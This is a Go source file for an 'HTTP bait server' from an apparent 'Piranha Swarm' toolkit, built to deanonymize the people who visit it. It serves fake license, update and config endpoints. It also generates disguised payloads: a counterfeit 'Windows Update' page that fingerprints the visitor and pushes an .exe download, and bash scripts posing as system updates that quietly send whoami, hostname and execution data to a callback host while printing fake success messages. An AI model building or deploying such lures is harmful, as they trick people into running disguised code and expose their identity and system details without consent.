package main

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"github.com/spf13/viper"
)

type HTTPBaitServer struct {
	config     *Config
	logger     *logrus.Logger
	sessions   map[string]*BaitSession
	mutex      sync.RWMutex
	router     *gin.Engine
	server     *http.Server
}

type Config struct {
	ListenAddress    string        `mapstructure:"listen_address"`
	ListenPort       int           `mapstructure:"listen_port"`
	TLSCertFile      string        `mapstructure:"tls_cert_file"`
	TLSKeyFile       string        `mapstructure:"tls_key_file"`
	Domain           string        `mapstructure:"domain"`
	LogLevel         string        `mapstructure:"log_level"`
	LogFormat        string        `mapstructure:"log_format"`
	SessionTTL       time.Duration `mapstructure:"session_ttl"`
	EnableHTTPS      bool          `mapstructure:"enable_https"`
	CallbackBaseURL  string        `mapstructure:"callback_base_url"`
	PayloadTypes     []string      `mapstructure:"payload_types"`
	FakeServices     []FakeService `mapstructure:"fake_services"`
}

type FakeService struct {
	Path        string            `mapstructure:"path"`
	Method      string            `mapstructure:"method"`
	Description string            `mapstructure:"description"`
	Headers     map[string]string `mapstructure:"headers"`
	Body        string            `mapstructure:"body"`
	StatusCode  int               `mapstructure:"status_code"`
}

type BaitSession struct {
	SessionID     string             `json:"session_id"`
	CreatedAt     time.Time          `json:"created_at"`
	LastSeen      time.Time          `json:"last_seen"`
	SourceIP      string             `json:"source_ip"`
	UserAgent     string             `json:"user_agent"`
	Referrer      string             `json:"referrer"`
	Requests      []HTTPRequest      `json:"requests"`
	Callbacks     []CallbackRequest  `json:"callbacks"`
	Fingerprint   BrowserFingerprint `json:"fingerprint"`
	TotalRequests int                `json:"total_requests"`
}

type HTTPRequest struct {
	Timestamp     time.Time         `json:"timestamp"`
	Method        string            `json:"method"`
	Path          string            `json:"path"`
	QueryParams   map[string]string `json:"query_params"`
	Headers       map[string]string `json:"headers"`
	Body          string            `json:"body,omitempty"`
	SourceIP      string            `json:"source_ip"`
	UserAgent     string            `json:"user_agent"`
	Referrer      string            `json:"referrer"`
	ResponseCode  int               `json:"response_code"`
	ResponseSize  int               `json:"response_size"`
}

type CallbackRequest struct {
	Timestamp   time.Time         `json:"timestamp"`
	CallbackID  string            `json:"callback_id"`
	SourceIP    string            `json:"source_ip"`
	Headers     map[string]string `json:"headers"`
	Body        string            `json:"body"`
	PayloadType string            `json:"payload_type"`
}

type BrowserFingerprint struct {
	AcceptLanguage   string   `json:"accept_language"`
	AcceptEncoding   string   `json:"accept_encoding"`
	AcceptCharset    string   `json:"accept_charset"`
	DNTHeader        string   `json:"dnt_header"`
	Connection       string   `json:"connection"`
	CacheControl     string   `json:"cache_control"`
	UpgradeInsecure  string   `json:"upgrade_insecure"`
	SecFetchSite     string   `json:"sec_fetch_site"`
	SecFetchMode     string   `json:"sec_fetch_mode"`
	SecFetchDest     string   `json:"sec_fetch_dest"`
	TLSFingerprint   string   `json:"tls_fingerprint,omitempty"`
}

func NewHTTPBaitServer(config *Config) *HTTPBaitServer {
	logger := logrus.New()
	
	// Configure logger
	level, err := logrus.ParseLevel(config.LogLevel)
	if err != nil {
		level = logrus.InfoLevel
	}
	logger.SetLevel(level)
	
	if config.LogFormat == "json" {
		logger.SetFormatter(&logrus.JSONFormatter{})
	}
	
	// Configure Gin
	if config.LogLevel == "debug" {
		gin.SetMode(gin.DebugMode)
	} else {
		gin.SetMode(gin.ReleaseMode)
	}
	
	server := &HTTPBaitServer{
		config:   config,
		logger:   logger,
		sessions: make(map[string]*BaitSession),
		router:   gin.New(),
	}
	
	server.setupRoutes()
	
	return server
}

func (s *HTTPBaitServer) setupRoutes() {
	// Middleware
	s.router.Use(s.loggingMiddleware())
	s.router.Use(s.sessionMiddleware())
	s.router.Use(gin.Recovery())
	
	// API routes
	api := s.router.Group("/api/v1")
	{
		api.GET("/status", s.handleStatus)
		api.GET("/sessions", s.handleGetSessions)
		api.GET("/sessions/:session_id", s.handleGetSession)
		api.POST("/callback/:callback_id", s.handleCallback)
	}
	
	// Bait routes
	bait := s.router.Group("/bait")
	{
		bait.GET("/license", s.handleLicenseCheck)
		bait.GET("/update", s.handleUpdateCheck)
		bait.GET("/config", s.handleConfigRequest)
		bait.POST("/data", s.handleDataSubmission)
		bait.GET("/download/:file", s.handleFileDownload)
	}
	
	// Fake service routes
	for _, service := range s.config.FakeServices {
		switch strings.ToUpper(service.Method) {
		case "GET":
			s.router.GET(service.Path, s.createFakeServiceHandler(service))
		case "POST":
			s.router.POST(service.Path, s.createFakeServiceHandler(service))
		case "PUT":
			s.router.PUT(service.Path, s.createFakeServiceHandler(service))
		case "DELETE":
			s.router.DELETE(service.Path, s.createFakeServiceHandler(service))
		default:
			s.router.Any(service.Path, s.createFakeServiceHandler(service))
		}
	}
	
	// Catch-all route for payload delivery
	s.router.NoRoute(s.handlePayloadDelivery)
}

func (s *HTTPBaitServer) loggingMiddleware() gin.HandlerFunc {
	return gin.LoggerWithFormatter(func(param gin.LogFormatterParams) string {
		logEntry := map[string]interface{}{
			"timestamp":   param.TimeStamp.Format(time.RFC3339),
			"status":      param.StatusCode,
			"latency":     param.Latency.String(),
			"client_ip":   param.ClientIP,
			"method":      param.Method,
			"path":        param.Path,
			"user_agent":  param.Request.UserAgent(),
			"error":       param.ErrorMessage,
		}
		
		if jsonData, err := json.Marshal(logEntry); err == nil {
			return string(jsonData) + "\n"
		}
		return ""
	})
}

func (s *HTTPBaitServer) sessionMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		// Extract or generate session ID
		sessionID := c.Query("session")
		if sessionID == "" {
			sessionID = c.GetHeader("X-Session-ID")
		}
		if sessionID == "" {
			sessionID = s.extractSessionFromPath(c.Request.URL.Path)
		}
		if sessionID == "" {
			sessionID = uuid.New().String()[:8]
		}
		
		// Update session
		session := s.updateSession(sessionID, c)
		
		// Add session to context
		c.Set("session", session)
		c.Set("session_id", sessionID)
		
		c.Next()
	}
}

func (s *HTTPBaitServer) updateSession(sessionID string, c *gin.Context) *BaitSession {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	
	session, exists := s.sessions[sessionID]
	if !exists {
		session = &BaitSession{
			SessionID:   sessionID,
			CreatedAt:   time.Now(),
			SourceIP:    c.ClientIP(),
			UserAgent:   c.GetHeader("User-Agent"),
			Referrer:    c.GetHeader("Referer"),
			Requests:    make([]HTTPRequest, 0),
			Callbacks:   make([]CallbackRequest, 0),
			Fingerprint: s.extractBrowserFingerprint(c),
		}
		s.sessions[sessionID] = session
	}
	
	session.LastSeen = time.Now()
	session.TotalRequests++
	
	// Record this request
	queryParams := make(map[string]string)
	for key, values := range c.Request.URL.Query() {
		if len(values) > 0 {
			queryParams[key] = values[0]
		}
	}
	
	headers := make(map[string]string)
	for key, values := range c.Request.Header {
		if len(values) > 0 {
			headers[key] = values[0]
		}
	}
	
	// Read body if present
	body := ""
	if c.Request.Body != nil {
		bodyBytes, _ := io.ReadAll(c.Request.Body)
		body = string(bodyBytes)
		// Restore body for further processing
		c.Request.Body = io.NopCloser(strings.NewReader(body))
	}
	
	request := HTTPRequest{
		Timestamp:    time.Now(),
		Method:       c.Request.Method,
		Path:         c.Request.URL.Path,
		QueryParams:  queryParams,
		Headers:      headers,
		Body:         body,
		SourceIP:     c.ClientIP(),
		UserAgent:    c.GetHeader("User-Agent"),
		Referrer:     c.GetHeader("Referer"),
		ResponseCode: 0, // Will be set later
		ResponseSize: 0, // Will be set later
	}
	
	session.Requests = append(session.Requests, request)
	
	return session
}

func (s *HTTPBaitServer) extractBrowserFingerprint(c *gin.Context) BrowserFingerprint {
	return BrowserFingerprint{
		AcceptLanguage:  c.GetHeader("Accept-Language"),
		AcceptEncoding:  c.GetHeader("Accept-Encoding"),
		AcceptCharset:   c.GetHeader("Accept-Charset"),
		DNTHeader:       c.GetHeader("DNT"),
		Connection:      c.GetHeader("Connection"),
		CacheControl:    c.GetHeader("Cache-Control"),
		UpgradeInsecure: c.GetHeader("Upgrade-Insecure-Requests"),
		SecFetchSite:    c.GetHeader("Sec-Fetch-Site"),
		SecFetchMode:    c.GetHeader("Sec-Fetch-Mode"),
		SecFetchDest:    c.GetHeader("Sec-Fetch-Dest"),
	}
}

func (s *HTTPBaitServer) extractSessionFromPath(path string) string {
	// Try to extract session ID from path patterns
	parts := strings.Split(path, "/")
	for _, part := range parts {
		if len(part) == 8 || len(part) == 36 { // UUID patterns
			return part
		}
	}
	return ""
}

func (s *HTTPBaitServer) handleStatus(c *gin.Context) {
	s.mutex.RLock()
	sessionCount := len(s.sessions)
	s.mutex.RUnlock()
	
	status := gin.H{
		"status":       "running",
		"timestamp":    time.Now(),
		"sessions":     sessionCount,
		"version":      "1.0.0",
		"uptime":       time.Since(time.Now()), // This would be tracked properly
	}
	
	c.JSON(http.StatusOK, status)
}

func (s *HTTPBaitServer) handleGetSessions(c *gin.Context) {
	s.mutex.RLock()
	sessions := make([]*BaitSession, 0, len(s.sessions))
	for _, session := range s.sessions {
		sessions = append(sessions, session)
	}
	s.mutex.RUnlock()
	
	c.JSON(http.StatusOK, gin.H{"sessions": sessions})
}

func (s *HTTPBaitServer) handleGetSession(c *gin.Context) {
	sessionID := c.Param("session_id")
	
	s.mutex.RLock()
	session, exists := s.sessions[sessionID]
	s.mutex.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Session not found"})
		return
	}
	
	c.JSON(http.StatusOK, session)
}

func (s *HTTPBaitServer) handleCallback(c *gin.Context) {
	callbackID := c.Param("callback_id")
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	// Read callback data
	bodyBytes, _ := io.ReadAll(c.Request.Body)
	body := string(bodyBytes)
	
	headers := make(map[string]string)
	for key, values := range c.Request.Header {
		if len(values) > 0 {
			headers[key] = values[0]
		}
	}
	
	callback := CallbackRequest{
		Timestamp:   time.Now(),
		CallbackID:  callbackID,
		SourceIP:    c.ClientIP(),
		Headers:     headers,
		Body:        body,
		PayloadType: c.Query("type"),
	}
	
	s.mutex.Lock()
	session.Callbacks = append(session.Callbacks, callback)
	s.mutex.Unlock()
	
	// Log callback activation
	s.logger.WithFields(logrus.Fields{
		"session_id":  session.SessionID,
		"callback_id": callbackID,
		"source_ip":   c.ClientIP(),
		"payload_type": callback.PayloadType,
	}).Warn("Callback activated")
	
	c.JSON(http.StatusOK, gin.H{"status": "received"})
}

func (s *HTTPBaitServer) handleLicenseCheck(c *gin.Context) {
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	// Generate a fake license response that includes callback payload
	callbackURL := fmt.Sprintf("%s/api/v1/callback/%s", s.config.CallbackBaseURL, s.generateCallbackID())
	
	response := gin.H{
		"license": gin.H{
			"valid":      true,
			"expires":    time.Now().Add(365 * 24 * time.Hour),
			"features":   []string{"premium", "enterprise", "api_access"},
			"callback":   callbackURL,
			"session_id": session.SessionID,
		},
		"update_check": callbackURL + "?type=license",
	}
	
	c.JSON(http.StatusOK, response)
}

func (s *HTTPBaitServer) handleUpdateCheck(c *gin.Context) {
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	callbackURL := fmt.Sprintf("%s/api/v1/callback/%s", s.config.CallbackBaseURL, s.generateCallbackID())
	
	response := gin.H{
		"update_available": true,
		"version":         "2.1.3",
		"download_url":    fmt.Sprintf("/bait/download/update_%s.exe", session.SessionID),
		"checksum":        s.generateChecksum(),
		"callback":        callbackURL + "?type=update",
		"critical":        false,
	}
	
	c.JSON(http.StatusOK, response)
}

func (s *HTTPBaitServer) handleConfigRequest(c *gin.Context) {
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	callbackURL := fmt.Sprintf("%s/api/v1/callback/%s", s.config.CallbackBaseURL, s.generateCallbackID())
	
	config := gin.H{
		"server":          s.config.CallbackBaseURL,
		"interval":        300,
		"retry_attempts":  3,
		"timeout":         30,
		"callback_url":    callbackURL + "?type=config",
		"session_id":      session.SessionID,
		"features": gin.H{
			"auto_update":     true,
			"telemetry":       true,
			"error_reporting": true,
		},
	}
	
	c.JSON(http.StatusOK, config)
}

func (s *HTTPBaitServer) handleDataSubmission(c *gin.Context) {
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	// Log data submission
	bodyBytes, _ := io.ReadAll(c.Request.Body)
	
	s.logger.WithFields(logrus.Fields{
		"session_id": session.SessionID,
		"source_ip":  c.ClientIP(),
		"data_size":  len(bodyBytes),
		"content_type": c.GetHeader("Content-Type"),
	}).Info("Data submission received")
	
	response := gin.H{
		"status":     "received",
		"session_id": session.SessionID,
		"timestamp":  time.Now(),
		"size":       len(bodyBytes),
	}
	
	c.JSON(http.StatusOK, response)
}

func (s *HTTPBaitServer) handleFileDownload(c *gin.Context) {
	filename := c.Param("file")
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	// Generate a payload binary based on the request
	payload := s.generatePayload(session.SessionID, filename)
	
	s.logger.WithFields(logrus.Fields{
		"session_id": session.SessionID,
		"source_ip":  c.ClientIP(),
		"filename":   filename,
		"size":       len(payload),
	}).Warn("Payload download initiated")
	
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", filename))
	c.Header("Content-Type", "application/octet-stream")
	c.Data(http.StatusOK, "application/octet-stream", payload)
}

func (s *HTTPBaitServer) createFakeServiceHandler(service FakeService) gin.HandlerFunc {
	return func(c *gin.Context) {
		// Set custom headers
		for key, value := range service.Headers {
			c.Header(key, value)
		}
		
		statusCode := service.StatusCode
		if statusCode == 0 {
			statusCode = http.StatusOK
		}
		
		if service.Body != "" {
			c.String(statusCode, service.Body)
		} else {
			c.JSON(statusCode, gin.H{
				"service":     service.Description,
				"timestamp":   time.Now(),
				"session_id":  c.GetString("session_id"),
			})
		}
	}
}

func (s *HTTPBaitServer) handlePayloadDelivery(c *gin.Context) {
	sessionValue, _ := c.Get("session")
	session := sessionValue.(*BaitSession)
	
	// Generate dynamic payload based on request
	callbackURL := fmt.Sprintf("%s/api/v1/callback/%s", s.config.CallbackBaseURL, s.generateCallbackID())
	
	// Determine payload type based on User-Agent or Accept headers
	userAgent := strings.ToLower(c.GetHeader("User-Agent"))
	var payload string
	
	if strings.Contains(userAgent, "windows") {
		payload = s.generateWindowsPayload(session.SessionID, callbackURL)
	} else if strings.Contains(userAgent, "linux") {
		payload = s.generateLinuxPayload(session.SessionID, callbackURL)
	} else if strings.Contains(userAgent, "curl") || strings.Contains(userAgent, "wget") {
		payload = s.generateScriptPayload(session.SessionID, callbackURL)
	} else {
		payload = s.generateWebPayload(session.SessionID, callbackURL)
	}
	
	s.logger.WithFields(logrus.Fields{
		"session_id": session.SessionID,
		"source_ip":  c.ClientIP(),
		"user_agent": c.GetHeader("User-Agent"),
		"path":       c.Request.URL.Path,
	}).Warn("Payload delivered")
	
	c.Header("Content-Type", "text/html")
	c.String(http.StatusOK, payload)
}

func (s *HTTPBaitServer) generateCallbackID() string {
	bytes := make([]byte, 8)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func (s *HTTPBaitServer) generateChecksum() string {
	bytes := make([]byte, 16)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}

func (s *HTTPBaitServer) generatePayload(sessionID, filename string) []byte {
	// Generate a simple executable payload that phones home
	// This is a simplified version - real implementation would generate
	// actual compiled binaries
	
	callbackURL := fmt.Sprintf("%s/api/v1/callback/%s", s.config.CallbackBaseURL, s.generateCallbackID())
	
	payload := fmt.Sprintf(`#!/bin/bash
# Auto-generated payload for session %s
# Filename: %s

curl -X POST "%s?type=execution&session=%s" \
  -H "User-Agent: payload/%s" \
  -d "executed=true&timestamp=$(date +%%s)" \
  2>/dev/null &

# Continue with fake functionality
echo "Update completed successfully"
exit 0
`, sessionID, filename, callbackURL, sessionID, sessionID)
	
	return []byte(payload)
}

func (s *HTTPBaitServer) generateWindowsPayload(sessionID, callbackURL string) string {
	return fmt.Sprintf(`
<!DOCTYPE html>
<html>
<head>
    <title>Windows Update</title>
</head>
<body>
    <h1>Windows Update Required</h1>
    <p>A critical update is available for your system.</p>
    <script>
        // Phone home
        fetch('%s?type=web&session=%s', {
            method: 'POST',
            body: JSON.stringify({
                platform: 'windows',
                timestamp: Date.now(),
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            })
        }).catch(() => {});
        
        // Redirect to download
        setTimeout(() => {
            window.location.href = '/bait/download/windows_update_%s.exe';
        }, 2000);
    </script>
</body>
</html>
`, callbackURL, sessionID, sessionID)
}

func (s *HTTPBaitServer) generateLinuxPayload(sessionID, callbackURL string) string {
	return fmt.Sprintf(`#!/bin/bash
# System Update Script
# Session: %s

# Phone home
curl -X POST "%s?type=shell&session=%s" \
  -H "User-Agent: Linux-Update/1.0" \
  -d "platform=linux&user=$(whoami)&hostname=$(hostname)" \
  2>/dev/null &

echo "Checking for updates..."
sleep 2
echo "System is up to date"
`, sessionID, callbackURL, sessionID)
}

func (s *HTTPBaitServer) generateScriptPayload(sessionID, callbackURL string) string {
	return fmt.Sprintf(`# Update script for session %s
curl -X POST "%s?type=script&session=%s" \
  -d "executed=true&timestamp=$(date +%%s)" 2>/dev/null
echo "completed"
`, sessionID, callbackURL, sessionID)
}

func (s *HTTPBaitServer) generateWebPayload(sessionID, callbackURL string) string {
	return fmt.Sprintf(`
<!DOCTYPE html>
<html>
<head>
    <title>Service Update</title>
    <script>
        fetch('%s?type=web&session=%s', {
            method: 'POST',
            body: JSON.stringify({
                timestamp: Date.now(),
                referrer: document.referrer,
                url: window.location.href
            })
        }).catch(() => {});
    </script>
</head>
<body>
    <h1>Service Temporarily Unavailable</h1>
    <p>Please try again later.</p>
</body>
</html>
`, callbackURL, sessionID)
}

func (s *HTTPBaitServer) Start() error {
	address := fmt.Sprintf("%s:%d", s.config.ListenAddress, s.config.ListenPort)
	
	s.server = &http.Server{
		Addr:         address,
		Handler:      s.router,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
		IdleTimeout:  120 * time.Second,
	}
	
	s.logger.WithFields(logrus.Fields{
		"address": address,
		"https":   s.config.EnableHTTPS,
	}).Info("Starting HTTP bait server")
	
	if s.config.EnableHTTPS && s.config.TLSCertFile != "" && s.config.TLSKeyFile != "" {
		return s.server.ListenAndServeTLS(s.config.TLSCertFile, s.config.TLSKeyFile)
	}
	
	return s.server.ListenAndServe()
}

func (s *HTTPBaitServer) Stop(ctx context.Context) error {
	if s.server != nil {
		return s.server.Shutdown(ctx)
	}
	return nil
}

func main() {
	var configFile string
	
	rootCmd := &cobra.Command{
		Use:   "http-bait",
		Short: "HTTP Bait Server for Piranha Swarm",
		Long:  `An HTTP server that logs full request details and forces callbacks for deanonymization.`,
		Run: func(cmd *cobra.Command, args []string) {
			// Load configuration
			config := &Config{}
			
			viper.SetConfigFile(configFile)
			viper.SetDefault("listen_address", "0.0.0.0")
			viper.SetDefault("listen_port", 8080)
			viper.SetDefault("domain", "bait.local")
			viper.SetDefault("log_level", "info")
			viper.SetDefault("log_format", "json")
			viper.SetDefault("session_ttl", "1h")
			viper.SetDefault("enable_https", false)
			viper.SetDefault("callback_base_url", "http://localhost:8080")
			
			if err := viper.ReadInConfig(); err != nil {
				log.Printf("Warning: Could not read config file: %v", err)
			}
			
			if err := viper.Unmarshal(config); err != nil {
				log.Fatalf("Could not unmarshal config: %v", err)
			}
			
			// Create and start server
			server := NewHTTPBaitServer(config)
			
			// Handle graceful shutdown
			ctx, cancel := context.WithCancel(context.Background())
			defer cancel()
			
			go func() {
				sigCh := make(chan os.Signal, 1)
				signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
				<-sigCh
				
				server.logger.Info("Received shutdown signal")
				shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 30*time.Second)
				defer shutdownCancel()
				
				if err := server.Stop(shutdownCtx); err != nil {
					server.logger.WithError(err).Error("Error stopping server")
				}
				cancel()
			}()
			
			// Start server
			if err := server.Start(); err != nil && err != http.ErrServerClosed {
				log.Fatalf("Server failed: %v", err)
			}
			
			<-ctx.Done()
			log.Println("HTTP bait server stopped")
		},
	}
	
	rootCmd.Flags().StringVarP(&configFile, "config", "c", "config/http-bait.yaml", "Configuration file path")
	
	if err := rootCmd.Execute(); err != nil {
		log.Fatalf("Command execution failed: %v", err)
	}
}